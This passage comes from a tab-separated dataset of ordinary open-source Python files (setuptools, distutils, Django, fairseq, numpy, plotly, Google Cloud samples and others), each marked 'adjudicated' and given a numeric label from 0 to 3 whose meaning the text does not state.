""sub-dir"")<<NEWL>>    assert new_folder.exists() is False<<NEWL>>    new_folder.mkdir()<<NEWL>>    assert new_folder.exists() is True<<NEWL>><<NEWL>>    # Make a folder from / absolute path<<NEWL>>    fs_root = Pathy.fluid(f""file://{alt_slashes}"")<<NEWL>>    new_folder = Pathy.fluid(fs_root / ""sub-dir-alt/"")<<NEWL>>    assert new_folder.exists() is False<<NEWL>>    new_folder.mkdir()<<NEWL>>    assert new_folder.exists() is True<<NEWL>><<NEWL>>    shutil.rmtree(tmp_dir)"
12	adjudicated	2	"""""""<<NEWL>>Create a dist_info directory<<NEWL>>As defined in the wheel specification<<NEWL>>""""""<<NEWL>><<NEWL>>import os<<NEWL>>import re<<NEWL>>import warnings<<NEWL>>from inspect import cleandoc<<NEWL>><<NEWL>>from distutils.core import Command<<NEWL>>from distutils import log<<NEWL>>from setuptools.extern import packaging<<NEWL>><<NEWL>><<NEWL>>class dist_info(Command):<<NEWL>><<NEWL>>    description = 'create a .dist-info directory'<<NEWL>><<NEWL>>    user_options = [<<NEWL>>        ('egg-base=', 'e', ""directory containing .egg-info directories""<<NEWL>>                           "" (default: top of the source tree)""),<<NEWL>>    ]<<NEWL>><<NEWL>>    def initialize_options(self):<<NEWL>>        self.egg_base = None<<NEWL>><<NEWL>>    def finalize_options(self):<<NEWL>>        pass<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        egg_info = self.get_finalized_command('egg_info')<<NEWL>>        egg_info.egg_base = self.egg_base<<NEWL>>        egg_info.finalize_options()<<NEWL>>        egg_info.run()<<NEWL>>        name = _safe(self.distribution.get_name())<<NEWL>>        version = _version(self.distribution.get_version())<<NEWL>>        base = self.egg_base or os.curdir<<NEWL>>        dist_info_dir = os.path.join(base, f""{name}-{version}.dist-info"")<<NEWL>>        log.info(""creating '{}'"".format(os.path.abspath(dist_info_dir)))<<NEWL>><<NEWL>>        bdist_wheel = self.get_finalized_command('bdist_wheel')<<NEWL>>        bdist_wheel.egg2dist(egg_info.egg_info, dist_info_dir)<<NEWL>><<NEWL>><<NEWL>>def _safe(component: str) -> str:<<NEWL>>    """"""Escape a component used to form a wheel name according to PEP 491""""""<<NEWL>>    return re.sub(r""[^\w\d.]+"", ""_"", component)<<NEWL>><<NEWL>><<NEWL>>def _version(version: str) -> str:<<NEWL>>    """"""Convert an arbitrary string to a version string.""""""<<NEWL>>    v = version.replace(' ', '.')<<NEWL>>    try:<<NEWL>>        return str(packaging.version.Version(v)).replace(""-"", ""_"")<<NEWL>>    except packaging.version.InvalidVersion:<<NEWL>>        msg = f""""""Invalid version: {version!r}.<<NEWL>>        !!\n\n<<NEWL>>        ###################<<NEWL>>        # Invalid version #<<NEWL>>        ###################<<NEWL>>        {version!r} is not valid according to PEP 440.\n<<NEWL>>        Please make sure specify a valid version for your package.<<NEWL>>        Also note that future releases of setuptools may halt the build process<<NEWL>>        if an invalid version is given.<<NEWL>>        \n\n!!<<NEWL>>        """"""<<NEWL>>        warnings.warn(cleandoc(msg))<<NEWL>>        return _safe(v).strip(""_"")"
383	adjudicated	1	"""""""distutils.command.install_scripts<<NEWL>><<NEWL>>Implements the Distutils 'install_scripts' command, for installing<<NEWL>>Python scripts.""""""<<NEWL>><<NEWL>># contributed by Bastian Kleineidam<<NEWL>><<NEWL>>import os<<NEWL>>from distutils.core import Command<<NEWL>>from distutils import log<<NEWL>>from stat import ST_MODE<<NEWL>><<NEWL>><<NEWL>>class install_scripts(Command):<<NEWL>><<NEWL>>    description = ""install scripts (Python or otherwise)""<<NEWL>><<NEWL>>    user_options = [<<NEWL>>        ('install-dir=', 'd', ""directory to install scripts to""),<<NEWL>>        ('build-dir=', 'b', ""build directory (where to install from)""),<<NEWL>>        ('force', 'f', ""force installation (overwrite existing files)""),<<NEWL>>        ('skip-build', None, ""skip the build steps""),<<NEWL>>    ]<<NEWL>><<NEWL>>    boolean_options = ['force', 'skip-build']<<NEWL>><<NEWL>>    def initialize_options(self):<<NEWL>>        self.install_dir = None<<NEWL>>        self.force = 0<<NEWL>>        self.build_dir = None<<NEWL>>        self.skip_build = None<<NEWL>><<NEWL>>    def finalize_options(self):<<NEWL>>        self.set_undefined_options('build', ('build_scripts', 'build_dir'))<<NEWL>>        self.set_undefined_options(<<NEWL>>            'install',<<NEWL>>            ('install_scripts', 'install_dir'),<<NEWL>>            ('force', 'force'),<<NEWL>>            ('skip_build', 'skip_build'),<<NEWL>>        )<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        if not self.skip_build:<<NEWL>>            self.run_command('build_scripts')<<NEWL>>        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)<<NEWL>>        if os.name == 'posix':<<NEWL>>            # Set the executable bits (owner, group, and world) on<<NEWL>>            # all the scripts we just installed.<<NEWL>>            for file in self.get_outputs():<<NEWL>>                if self.dry_run:<<NEWL>>                    log.info(""changing mode of %s"", file)<<NEWL>>                else:<<NEWL>>                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777<<NEWL>>                    log.info(""changing mode of %s to %o"", file, mode)<<NEWL>>                    os.chmod(file, mode)<<NEWL>><<NEWL>>    def get_inputs(self):<<NEWL>>        return self.distribution.scripts or []<<NEWL>><<NEWL>>    def get_outputs(self):<<NEWL>>        return self.outfiles or []"
230	adjudicated	0	"import openai<<NEWL>>import spacy<<NEWL>>from translate import Translator<<NEWL>>from app.ai.WolframeAlpha import WolframAlpha<<NEWL>>from app.models.MongoDb import get_openai_key,get_wolframalpha_key<<NEWL>><<NEWL>>class MicroAI:<<NEWL>>    def __init__(self, api_key):<<NEWL>>        self.api_key = api_key<<NEWL>>        self.nlp = spacy.load(""en_core_web_sm"")<<NEWL>><<NEWL>>    def get_engine(self, question):<<NEWL>>        doc = self.nlp(question)<<NEWL>>        if any(token.text.lower() in ['classify', 'categorize', 'group'] for token in doc):<<NEWL>>            return ""text-davinci-002""<<NEWL>>        elif any(token.text.lower() in ['summarize', 'brief', 'short'] for token in doc):<<NEWL>>            return ""text-davinci-002""<<NEWL>>        elif any(token.text.lower() in ['translate', 'conversion'] for token in doc):<<NEWL>>            return ""text-davinci-002""<<NEWL>>        elif any(token.text.lower() in ['solve', 'calculate', 'compute'] for token in doc):<<NEWL>>            return ""text-davinci-003""<<NEWL>>        elif any(token.text.lower() in ['create', 'build', 'design', 'generate'] for token in doc):<<NEWL>>            return ""davinci-codex""<<NEWL>>        else:<<NEWL>>            return ""text-davinci-002""<<NEWL>><<NEWL>>    def generate_answer(self, question):<<NEWL>>        wolfram = WolframAlpha(app_id=get_wolframalpha_key())<<NEWL>>        answer = wolfram.answer_question(question=question)<<NEWL>>        if ""Lá»i: "" in answer:<<NEWL>>            translator = Translator(to_lang='en', from_lang='vi')<<NEWL>>            question_en = translator.translate(question)<<NEWL>>            engine = self.get_engine(question_en)<<NEWL>><<NEWL>>            openai.api_key = self.api_key<<NEWL>>            completions = openai.Completion.create(<<NEWL>>                engine=engine,<<NEWL>>                prompt=question_en,<<NEWL>>                max_tokens=1024,<<NEWL>>                n=1,<<NEWL>>                stop=None,<<NEWL>>                temperature=0.5,<<NEWL>>            )<<NEWL>>            message = completions.choices[0].text<<NEWL>><<NEWL>>            result = {'engine': engine, 'question': question, 'answer': message}<<NEWL>>            return result<<NEWL>>        else:<<NEWL>>            result = {'engine': 'WolframAlpha', 'question': question, 'answer': answer}<<NEWL>>            return result"
370	adjudicated	2	"# Copyright 2022 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import os<<NEWL>>import re<<NEWL>>import uuid<<NEWL>><<NEWL>>from google.cloud import iam_v2<<NEWL>>from google.cloud.iam_v2 import types<<NEWL>>import pytest<<NEWL>>from snippets.create_deny_policy import create_deny_policy<<NEWL>>from snippets.delete_deny_policy import delete_deny_policy<<NEWL>><<NEWL>>PROJECT_ID = os.environ[""IAM_PROJECT_ID""]<<NEWL>>GOOGLE_APPLICATION_CREDENTIALS = os.environ[""IAM_CREDENTIALS""]<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def deny_policy(capsys: ""pytest.CaptureFixture[str]"") -> None:<<NEWL>>    policy_id = f""test-deny-policy-{uuid.uuid4()}""<<NEWL>><<NEWL>>    # Delete any existing policies. Otherwise it might throw quota issue.<<NEWL>>    delete_existing_deny_policies(PROJECT_ID, ""test-deny-policy"")<<NEWL>><<NEWL>>    # Create the Deny policy.<<NEWL>>    create_deny_policy(PROJECT_ID, policy_id)<<NEWL>><<NEWL>>    yield policy_id<<NEWL>><<NEWL>>    # Delete the Deny policy and assert if deleted.<<NEWL>>    delete_deny_policy(PROJECT_ID, policy_id)<<NEWL>>    out, _ = capsys.readouterr()<<NEWL>>    assert re.search(f""Deleted the deny policy: {policy_id}"", out)<<NEWL>><<NEWL>><<NEWL>>def delete_existing_deny_policies(project_id: str, delete_name_prefix: str) -> None:<<NEWL>>    policies_client = iam_v2.PoliciesClient()<<NEWL>><<NEWL>>    attachment_point = f""cloudresourcemanager.googleapis.com%2Fprojects%2F{project_id}""<<NEWL>><<NEWL>>    request = types.ListPoliciesRequest()<<NEWL>>    request.parent = f""policies/{attachment_point}/denypolicies""<<NEWL>>    for policy in policies_client.list_policies(request=request):<<NEWL>>        if delete_name_prefix in policy.name:<<NEWL>>            delete_deny_policy(PROJECT_ID, str(policy.name).rsplit(""/"", 1)[-1])"
261	adjudicated	0	"from django.contrib.auth.forms import UserCreationForm<<NEWL>>from django import forms<<NEWL>>from django.contrib.auth.models import User<<NEWL>>from .models import Post<<NEWL>><<NEWL>>class RegisterForm(UserCreationForm):<<NEWL>>    email = forms.EmailField(label = ""Email"")<<NEWL>>    firstname = forms.CharField(label = ""First name"")<<NEWL>>    lastname = forms.CharField(label = ""Last name"")<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        model = User<<NEWL>>        fields = (""username"", ""firstname"", ""lastname"", ""email"", )<<NEWL>><<NEWL>>    def save(self, commit=True):<<NEWL>>        user = super(RegisterForm, self).save(commit=False)<<NEWL>>        firstname = self.cleaned_data[""firstname""]<<NEWL>>        lastname = self.cleaned_data[""lastname""]<<NEWL>>        user.first_name = firstname<<NEWL>>        user.last_name = lastname<<NEWL>>        user.email = self.cleaned_data[""email""]<<NEWL>>        if commit:<<NEWL>>            user.save()<<NEWL>>        return user<<NEWL>>    <<NEWL>>class PostForm(forms.ModelForm):<<NEWL>>    text = forms.CharField(max_length=1000, widget=forms.Textarea(attrs={'placeholder': 'What\'s on your mind?', 'onchange': 'character_count()', 'onkeypress': 'character_count()', 'onfocus': 'character_count()' ,'oninput': 'character_count()', 'onkeyup':'character_count()','onpaste':'character_count()'}))<<NEWL>>    images = forms.ImageField(required=False,widget=forms.ClearableFileInput(attrs={'multiple': True, 'onchange': 'previewImages(this)'}))<<NEWL>>    class Meta:<<NEWL>>        model = Post<<NEWL>>        fields = (""text"", )<<NEWL>><<NEWL>>class SearchForm(forms.Form):<<NEWL>>    search = forms.CharField(max_length=100, widget=forms.TextInput(attrs={'placeholder': 'Type something or someone to search for ...'}))<<NEWL>><<NEWL>>class UpdateProfileForm(forms.Form):<<NEWL>>    first_name = forms.CharField(max_length=100, required=False)<<NEWL>>    last_name = forms.CharField(max_length=100, required=False)<<NEWL>>    profile_image = forms.ImageField(required=False)<<NEWL>>    remove_profile_image = forms.BooleanField(required=False)<<NEWL>>    profile_cover_photo = forms.ImageField(required=False)<<NEWL>>    remove_cover_photo = forms.BooleanField(required=False)<<NEWL>>    profile_bio = forms.CharField(max_length=500, required=False, widget=forms.Textarea(attrs={'placeholder': 'Write something about yourself ...'}))"
321	adjudicated	3	"# Copyright (c) Facebook, Inc. and its affiliates.<<NEWL>>#<<NEWL>># This source code is licensed under the MIT license found in the<<NEWL>># LICENSE file in the root directory of this source tree.<<NEWL>><<NEWL>>from fairseq.optim import LegacyFairseqOptimizer, register_optimizer<<NEWL>><<NEWL>><<NEWL>>@register_optimizer(""lamb"")<<NEWL>>class FairseqLAMB(LegacyFairseqOptimizer):<<NEWL>>    """"""LAMB optimizer.""""""<<NEWL>><<NEWL>>    def __init__(self, args, params):<<NEWL>>        super().__init__(args)<<NEWL>>        try:<<NEWL>>            from apex.optimizers import FusedLAMB<<NEWL>><<NEWL>>            self._optimizer = FusedLAMB(params, **self.optimizer_config)<<NEWL>>        except ImportError:<<NEWL>>            raise ImportError(""Please install apex to use LAMB optimizer"")<<NEWL>><<NEWL>>    @staticmethod<<NEWL>>    def add_args(parser):<<NEWL>>        """"""Add optimizer-specific arguments to the parser.""""""<<NEWL>>        # fmt: off<<NEWL>>        parser.add_argument('--lamb-betas', default='(0.9, 0.999)', metavar='B',<<NEWL>>                            help='betas for LAMB optimizer')<<NEWL>>        parser.add_argument('--lamb-eps', type=float, default=1e-8, metavar='D',<<NEWL>>                            help='epsilon for LAMB optimizer')<<NEWL>>        parser.add_argument('--weight-decay', '--wd', default=0.0, type=float, metavar='WD',<<NEWL>>                            help='weight decay')<<NEWL>>        # fmt: on<<NEWL>><<NEWL>>    @property<<NEWL>>    def optimizer_config(self):<<NEWL>>        """"""<<NEWL>>        Return a kwarg dictionary that will be used to override optimizer<<NEWL>>        args stored in checkpoints. This allows us to load a checkpoint and<<NEWL>>        resume training using a different set of optimizer args, e.g., with a<<NEWL>>        different learning rate.<<NEWL>>        """"""<<NEWL>>        return {<<NEWL>>            ""lr"": self.args.lr[0],<<NEWL>>            ""betas"": eval(self.args.lamb_betas),<<NEWL>>            ""eps"": self.args.lamb_eps,<<NEWL>>            ""weight_decay"": self.args.weight_decay,<<NEWL>>        }<<NEWL>><<NEWL>>    @property<<NEWL>>    def supports_flat_params(self):<<NEWL>>        return False"
330	adjudicated	0	"""""""Tests for the NumpyVersion class.<<NEWL>><<NEWL>>""""""<<NEWL>>from numpy.testing import assert_, assert_raises<<NEWL>>from numpy.lib import NumpyVersion<<NEWL>><<NEWL>><<NEWL>>def test_main_versions():<<NEWL>>    assert_(NumpyVersion('1.8.0') == '1.8.0')<<NEWL>>    for ver in ['1.9.0', '2.0.0', '1.8.1', '10.0.1']:<<NEWL>>        assert_(NumpyVersion('1.8.0') < ver)<<NEWL>><<NEWL>>    for ver in ['1.7.0', '1.7.1', '0.9.9']:<<NEWL>>        assert_(NumpyVersion('1.8.0') > ver)<<NEWL>><<NEWL>><<NEWL>>def test_version_1_point_10():<<NEWL>>    # regression test for gh-2998.<<NEWL>>    assert_(NumpyVersion('1.9.0') < '1.10.0')<<NEWL>>    assert_(NumpyVersion('1.11.0') < '1.11.1')<<NEWL>>    assert_(NumpyVersion('1.11.0') == '1.11.0')<<NEWL>>    assert_(NumpyVersion('1.99.11') < '1.99.12')<<NEWL>><<NEWL>><<NEWL>>def test_alpha_beta_rc():<<NEWL>>    assert_(NumpyVersion('1.8.0rc1') == '1.8.0rc1')<<NEWL>>    for ver in ['1.8.0', '1.8.0rc2']:<<NEWL>>        assert_(NumpyVersion('1.8.0rc1') < ver)<<NEWL>><<NEWL>>    for ver in ['1.8.0a2', '1.8.0b3', '1.7.2rc4']:<<NEWL>>        assert_(NumpyVersion('1.8.0rc1') > ver)<<NEWL>><<NEWL>>    assert_(NumpyVersion('1.8.0b1') > '1.8.0a2')<<NEWL>><<NEWL>><<NEWL>>def test_dev_version():<<NEWL>>    assert_(NumpyVersion('1.9.0.dev-Unknown') < '1.9.0')<<NEWL>>    for ver in ['1.9.0', '1.9.0a1', '1.9.0b2', '1.9.0b2.dev-ffffffff']:<<NEWL>>        assert_(NumpyVersion('1.9.0.dev-f16acvda') < ver)<<NEWL>><<NEWL>>    assert_(NumpyVersion('1.9.0.dev-f16acvda') == '1.9.0.dev-11111111')<<NEWL>><<NEWL>><<NEWL>>def test_dev_a_b_rc_mixed():<<NEWL>>    assert_(NumpyVersion('1.9.0a2.dev-f16acvda') == '1.9.0a2.dev-11111111')<<NEWL>>    assert_(NumpyVersion('1.9.0a2.dev-6acvda54') < '1.9.0a2')<<NEWL>><<NEWL>><<NEWL>>def test_dev0_version():<<NEWL>>    assert_(NumpyVersion('1.9.0.dev0+Unknown') < '1.9.0')<<NEWL>>    for ver in ['1.9.0', '1.9.0a1', '1.9.0b2', '1.9.0b2.dev0+ffffffff']:<<NEWL>>        assert_(NumpyVersion('1.9.0.dev0+f16acvda') < ver)<<NEWL>><<NEWL>>    assert_(NumpyVersion('1.9.0.dev0+f16acvda') == '1.9.0.dev0+11111111')<<NEWL>><<NEWL>><<NEWL>>def test_dev0_a_b_rc_mixed():<<NEWL>>    assert_(NumpyVersion('1.9.0a2.dev0+f16acvda') == '1.9.0a2.dev0+11111111')<<NEWL>>    assert_(NumpyVersion('1.9.0a2.dev0+6acvda54') < '1.9.0a2')<<NEWL>><<NEWL>><<NEWL>>def test_raises():<<NEWL>>    for ver in ['1.9', '1,9.0', '1.7.x']:<<NEWL>>        assert_raises(ValueError, NumpyVersion, ver)"
270	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""funnelarea.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
361	adjudicated	3	"#!/usr/bin/env python<<NEWL>><<NEWL>># Copyright 2021 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># [START privateca_disable_ca]<<NEWL>>import google.cloud.security.privateca_v1 as privateca_v1<<NEWL>><<NEWL>><<NEWL>>def disable_certificate_authority(<<NEWL>>    project_id: str, location: str, ca_pool_name: str, ca_name: str<<NEWL>>) -> None:<<NEWL>>    """"""<<NEWL>>    Disable a Certificate Authority which is present in the given CA pool.<<NEWL>><<NEWL>>    Args:<<NEWL>>        project_id: project ID or project number of the Cloud project you want to use.<<NEWL>>        location: location you want to use. For a list of locations, see: https://cloud.google.com/certificate-authority-service/docs/locations.<<NEWL>>        ca_pool_name: the name of the CA pool under which the CA is present.<<NEWL>>        ca_name: the name of the CA to be disabled.<<NEWL>>    """"""<<NEWL>><<NEWL>>    caServiceClient = privateca_v1.CertificateAuthorityServiceClient()<<NEWL>>    ca_path = caServiceClient.certificate_authority_path(<<NEWL>>        project_id, location, ca_pool_name, ca_name<<NEWL>>    )<<NEWL>><<NEWL>>    # Create the Disable Certificate Authority Request.<<NEWL>>    request = privateca_v1.DisableCertificateAuthorityRequest(name=ca_path)<<NEWL>><<NEWL>>    # Disable the Certificate Authority.<<NEWL>>    operation = caServiceClient.disable_certificate_authority(request=request)<<NEWL>>    result = operation.result()<<NEWL>><<NEWL>>    print(""Operation result:"", result)<<NEWL>><<NEWL>>    # Get the current CA state.<<NEWL>>    ca_state = caServiceClient.get_certificate_authority(name=ca_path).state<<NEWL>><<NEWL>>    # Check if the CA is disabled.<<NEWL>>    if ca_state == privateca_v1.CertificateAuthority.State.DISABLED:<<NEWL>>        print(""Disabled Certificate Authority:"", ca_name)<<NEWL>>    else:<<NEWL>>        print(""Cannot disable the Certificate Authority ! Current CA State:"", ca_state)<<NEWL>><<NEWL>><<NEWL>># [END privateca_disable_ca]"
221	adjudicated	0	"from viktor._vendor import libcst<<NEWL>><<NEWL>>from viktor._vendor.libcst import matchers as m<<NEWL>><<NEWL>>from viktor._codemod.helpers import match_controller_class<<NEWL>><<NEWL>><<NEWL>>class Visitor(libcst.CSTVisitor):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class Transformer(libcst.CSTTransformer):<<NEWL>><<NEWL>>    def __init__(self, visitor):<<NEWL>>        super().__init__()<<NEWL>><<NEWL>>        self.OptionField_ImportAlias = None<<NEWL>><<NEWL>>    def leave_ImportAlias_asname(self, node) -> None:<<NEWL>>        if node.name.value == ""OptionField"":<<NEWL>>            if node.asname:<<NEWL>>                self.OptionField_ImportAlias = node.asname.name.value<<NEWL>><<NEWL>>    def leave_ClassDef(self, original_node, updated_node):<<NEWL>><<NEWL>>        if not match_controller_class(original_node):<<NEWL>>            return updated_node<<NEWL>><<NEWL>>        body = updated_node.body<<NEWL>>        new_statements = []<<NEWL>>        for statement in body.body:<<NEWL>>            if m.matches(statement, m.SimpleStatementLine()):<<NEWL>>                try:<<NEWL>>                    target = statement.body[0].targets[0].target<<NEWL>>                    if target.value.startswith('viktor_'):<<NEWL>>                        continue<<NEWL>>                except AttributeError:  # 'targets' not present<<NEWL>>                    pass<<NEWL>><<NEWL>>            new_statements.append(statement)<<NEWL>><<NEWL>>        body = body.with_changes(body=new_statements)<<NEWL>><<NEWL>>        return updated_node.with_changes(body=body)<<NEWL>><<NEWL>>    def leave_Call(self, node, updated_node):<<NEWL>><<NEWL>>        try:<<NEWL>>            if node.func.value not in (self.OptionField_ImportAlias, ""OptionField""):<<NEWL>>                return updated_node<<NEWL>>        except AttributeError:  # func may not have 'value'<<NEWL>>            return updated_node<<NEWL>><<NEWL>>        new_args = []<<NEWL>>        for arg_index, arg in enumerate(node.args):<<NEWL>><<NEWL>>            if arg.keyword is not None:<<NEWL>>                if arg.keyword.value == 'autoselect_single_option' and arg.value.value == 'False':<<NEWL>>                    continue<<NEWL>>            new_args.append(arg)<<NEWL>><<NEWL>>        new_args[-1] = new_args[-1].with_changes(comma=None)<<NEWL>><<NEWL>>        return updated_node.with_changes(args=new_args)"
3	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""font"", parent_name=""funnelarea.title"", **kwargs):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
392	adjudicated	1	"from django.core import checks<<NEWL>><<NEWL>>NOT_PROVIDED = object()<<NEWL>><<NEWL>><<NEWL>>class FieldCacheMixin:<<NEWL>>    """"""Provide an API for working with the model's fields value cache.""""""<<NEWL>><<NEWL>>    def get_cache_name(self):<<NEWL>>        raise NotImplementedError<<NEWL>><<NEWL>>    def get_cached_value(self, instance, default=NOT_PROVIDED):<<NEWL>>        cache_name = self.get_cache_name()<<NEWL>>        try:<<NEWL>>            return instance._state.fields_cache[cache_name]<<NEWL>>        except KeyError:<<NEWL>>            if default is NOT_PROVIDED:<<NEWL>>                raise<<NEWL>>            return default<<NEWL>><<NEWL>>    def is_cached(self, instance):<<NEWL>>        return self.get_cache_name() in instance._state.fields_cache<<NEWL>><<NEWL>>    def set_cached_value(self, instance, value):<<NEWL>>        instance._state.fields_cache[self.get_cache_name()] = value<<NEWL>><<NEWL>>    def delete_cached_value(self, instance):<<NEWL>>        del instance._state.fields_cache[self.get_cache_name()]<<NEWL>><<NEWL>><<NEWL>>class CheckFieldDefaultMixin:<<NEWL>>    _default_hint = (""<valid default>"", ""<invalid default>"")<<NEWL>><<NEWL>>    def _check_default(self):<<NEWL>>        if (<<NEWL>>            self.has_default()<<NEWL>>            and self.default is not None<<NEWL>>            and not callable(self.default)<<NEWL>>        ):<<NEWL>>            return [<<NEWL>>                checks.Warning(<<NEWL>>                    ""%s default should be a callable instead of an instance ""<<NEWL>>                    ""so that it's not shared between all field instances.""<<NEWL>>                    % (self.__class__.__name__,),<<NEWL>>                    hint=(<<NEWL>>                        ""Use a callable instead, e.g., use `%s` instead of ""<<NEWL>>                        ""`%s`."" % self._default_hint<<NEWL>>                    ),<<NEWL>>                    obj=self,<<NEWL>>                    id=""fields.E010"",<<NEWL>>                )<<NEWL>>            ]<<NEWL>>        else:<<NEWL>>            return []<<NEWL>><<NEWL>>    def check(self, **kwargs):<<NEWL>>        errors = super().check(**kwargs)<<NEWL>>        errors.extend(self._check_default())<<NEWL>>        return errors"
143	adjudicated	0	"#<<NEWL>># Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>import os<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from tests.providers.google.cloud.utils.gcp_authenticator import GCP_DATASTORE_KEY<<NEWL>>from tests.test_utils.gcp_system_helpers import CLOUD_DAG_FOLDER, GoogleSystemTest, provide_gcp_context<<NEWL>><<NEWL>>BUCKET = os.environ.get(""GCP_DATASTORE_BUCKET"", ""datastore-system-test"")<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.backend(""mysql"", ""postgres"")<<NEWL>>@pytest.mark.credential_file(GCP_DATASTORE_KEY)<<NEWL>>class TestGcpDatastoreSystem(GoogleSystemTest):<<NEWL>>    @provide_gcp_context(GCP_DATASTORE_KEY)<<NEWL>>    def setup_method(self):<<NEWL>>        self.create_gcs_bucket(BUCKET, location=""europe-central2"")<<NEWL>><<NEWL>>    @provide_gcp_context(GCP_DATASTORE_KEY)<<NEWL>>    def teardown_method(self):<<NEWL>>        self.delete_gcs_bucket(BUCKET)<<NEWL>><<NEWL>>    @provide_gcp_context(GCP_DATASTORE_KEY)<<NEWL>>    def test_run_example_dag(self):<<NEWL>>        